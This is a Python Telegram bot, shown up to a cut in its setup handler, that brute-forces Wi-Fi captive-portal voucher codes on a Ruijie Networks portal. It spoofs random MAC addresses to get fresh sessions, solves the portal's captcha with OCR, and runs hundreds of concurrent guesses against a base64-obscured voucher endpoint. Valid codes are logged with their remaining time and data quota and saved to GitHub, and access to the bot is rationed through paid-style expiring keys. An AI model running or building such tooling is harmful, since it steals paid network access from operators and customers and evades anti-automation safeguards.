import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')
REPO_OWNER = os.environ.get('REPO_OWNER')
REPO_NAME = os.environ.get('REPO_NAME')

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}              # {chat_id: {"session_url": ...}}
approve = {}                # {chat_id: True/False}
scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
success_texts = {}          # {chat_id: [{"code": ..., "session_id": ..., "plan": ..., "usage": ..., "quota": ..., "expire": ...}, ...]}
limited_texts = {}          # {chat_id: [code, ...]}
captcha_state = {}          # captcha cache per chat_id

# New additions
notify_setting = {}         # {chat_id: True/False}
DEFAULT_NOTIFY = True       # Default to ON
last_scan_params = {}       # {chat_id: {"mode": int, "length": int, "target": int|None, "plan_filters": list}}
pending_brute = {}          # {chat_id: {"mode": int, "length": int, "target": int|None, "plan_filters": list}}
success_messages = {}
limited_messages = {}

session = None
_connector = None
CONCURRENCY = 500
_voucher_sem = None
_start_time = time.monotonic()

# Domain changed to portal-mm-as.ruijienetworks.com
BASE_DOMAIN = "portal-mm-as.ruijienetworks.com"
BASE_URL = f"https://{BASE_DOMAIN}"

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
            second=0, tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

def plan_to_minutes(s):
    """Parse plan string like '1d', '2h', '30min', '1mo', 'unlimit', '2h 30m' → total minutes."""
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    if hours > 0:
        return f"{hours}h {mins}m"
    elif mins > 0:
        return f"{mins}m"
    else:
        return f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

def _format_bytes(bytes_val):
    """Format bytes to human readable GB/MB/KB"""
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3:
            return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2:
            return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024:
            return f"{bytes_val/1024:.3f} KB"
        else:
            return f"{bytes_val:.0f} B"
    except:
        return "N/A"

def _format_quota(used, total):
    """Format quota string like '1.447 MB(307.747 KB↑ / 1.146 MB↓)' """
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
        else:
            total_used = used
            up = 0
            down = 0
        
        used_str = _format_bytes(total_used)
        if up and down:
            return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)"
        return used_str
    except:
        return "N/A"

async def get_balance(token):
    """Fetch remaining time AND data usage for a given token."""
    url = f"{BASE_URL}/api/auth/balance/getBalance/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': BASE_DOMAIN,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': f'{BASE_URL}/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                # Fallback to previous known working URL if 404
                alt_url = f"{BASE_URL}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200:
                        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            
            try:
                data = json.loads(raw)
            except Exception:
                return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            
            result = {
                "time": "N/A",
                "usage": "N/A", 
                "quota": "N/A",
                "plan": "N/A",
                "expire": "N/A"
            }
            
            candidates = [data]
            for nested_key in ['result', 'data']:
                if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                    candidates.append(data[nested_key])
            
            for d in candidates:
                if not isinstance(d, dict):
                    continue
                
                # Time related
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_minutes(val)
                        break
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time']:
                    val = d.get(key)
                    if val is not None:
                        result["time"] = _parse_seconds(val)
                        break
                
                # Data usage
                usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if usage:
                    if isinstance(usage, dict):
                        result["usage"] = _format_quota(usage)
                    else:
                        result["usage"] = _format_bytes(usage)
                
                # Quota
                quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                session_quota = d.get('sessionQuota')
                total_quota = d.get('totalQuota')
                if session_quota and total_quota:
                    result["quota"] = f"{_format_bytes(session_quota)} / {_format_bytes(total_quota)}"
                elif quota:
                    result["quota"] = _format_bytes(quota)
                
                # Plan name
                plan = d.get('plan') or d.get('planName') or d.get('internetPlan') or d.get('package')
                if plan:
                    result["plan"] = str(plan)
                
                # Expire time
                expire = d.get('expireTime') or d.get('expiration') or d.get('expire') or d.get('validUntil')
                if expire:
                    result["expire"] = str(expire)
            
            return result
    except Exception as e:
        print(f"[get_balance] error for {token}: {e}")
        return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

def iter_codes(mode, length):
    """
    mode: 1=digits, 2=lowercase, 3=uppercase, 4=mixed case, 5=alphanumeric
    length: code length
    """
    if mode == 1:
        chars = string.digits
    elif mode == 2:
        chars = string.ascii_lowercase
    elif mode == 3:
        chars = string.ascii_uppercase
    elif mode == 4:
        chars = string.ascii_letters  # a-zA-Z
    elif mode == 5:
        chars = string.ascii_lowercase + string.digits
    else:
        raise ValueError(f"Invalid mode: {mode}. Use 1-5")
    
    # Random generation for all modes (safer for rate limits)
    while True:
        yield "".join(random.choice(chars) for _ in range(length))

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling (per voucher) ─────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': BASE_DOMAIN,
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(f'{BASE_URL}/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    headers = {
        'authority': BASE_DOMAIN,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'referer': f'{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post(f'{BASE_URL}/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            return "sessionId" in str(response.url)
    except:
        return False

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    # Updated for portal-mm-as.ruijienetworks.com
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": BASE_DOMAIN,
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": BASE_URL,
                "referer": f"{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
            except:
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/3)")
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        
        # Fetch plan duration AND data usage
        plan_str = "N/A"
        usage_str = "N/A"
        quota_str = "N/A"
        expire_str = "N/A"
        try:
            # Extract token from logonUrl: token=...&
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            
            # If no token found, try to use sessionId as fallback
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
                
            balance_info = await get_balance(token)
            if isinstance(balance_info, dict):
                plan_str = balance_info.get("time", "N/A")
                usage_str = balance_info.get("usage", "N/A")
                quota_str = balance_info.get("quota", "N/A")
                expire_str = balance_info.get("expire", "N/A")
        except Exception:
            pass

        # Apply plan filter if specified
        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                return None

        # Store success with plan and usage
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code, 
            "session_id": session_id, 
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str,
            "expire": expire_str
        })

        await SUCCESS_CODE.put({
            "chat_id": chat_id, 
            "code": code, 
            "session_id": session_id, 
            "plan": plan_str,
            "usage": usage_str,
            "quota": quota_str
        })

        # Notification if enabled
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_lines = []
            for item in success_texts[chat_id]:
                line = f"`{item['code']}` – ⏳ {item['plan']}"
                if item.get('usage') and item['usage'] != 'N/A':
                    line += f"\n   📊 {item['usage']}"
                if item.get('quota') and item['quota'] != 'N/A':
                    line += f" | 💾 {item['quota']}"
                code_lines.append(line)
            code_text = "\n".join(code_lines)
            
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n{code_text}", parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=success_messages[chat_id],
                        text=f"✅ Success Codes:\n{code_text}",
                        parse_mode="Markdown"
                    )
            except:
                pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=limited_messages[chat_id],
                        text=f"⚠️ Limited Codes:\n{limited_line}"
                    )
            except:
                pass

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    # No total for random generation (infinite space)
    total = None

    checked = 0
    found = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(1000):
                batch.append(next(code_iter))

            if time.monotonic() - last_key_check >= 600:
                auth_list, _ = await get_file_content("auth_list.json")
                if (
                    str(chat_id) not in auth_list
                    or not check_key_expiration(auth_list[str(chat_id)])
                ):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message,
                        plan_filters=plan_filters
                    )

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            finish_text = "✅ Scan completed."
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                await bot.send_message(chat_id, finish_text)
        scan_tasks.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append({
                            "code": code,
                            "plan": item.get("plan", "N/A"),
                            "usage": item.get("usage", "N/A"),
                            "quota": item.get("quota", "N/A")
                        })
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ **Setup**:\n"
        "   /setup <url>\n\n"
        "၂။ **ရှာဖွေခြင်း**:\n"
        "   /brute <mode> <length> [target]\n"
        "   Mode:\n"
        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "   ဥပမာ: /brute 1 6 5\n\n"
        "၃။ /status  – အခြေအနေကြည့်\n"
        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း (Data Usage ပါ)\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
        "၉။ /notify  – Notification ON/OFF\n\n"
        "၁၀။ /key    – Key အတည်ပြုရန်\n"
        "၁၀။ /genkey <duration> <user_id> - (Admin) Key ထုတ်ပေးရန်\n"
        "   duration: 30m, 1h, 2d, 1h30m, unlimited\n"
        "၁၀။ /delkey <user_id> - (Admin) Key ဖျက်ရန်\n"
        "၁၀။ /listkeys - (Admin) Key များကြည့်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key in auth_list:
        if check_key_expiration(auth_list[key]):
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
        return
    url = args[1]
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        user_data[cid] = {'session_url': url}
        # Clear old success/limited data for fresh start
        success_texts.pop(cid, None)
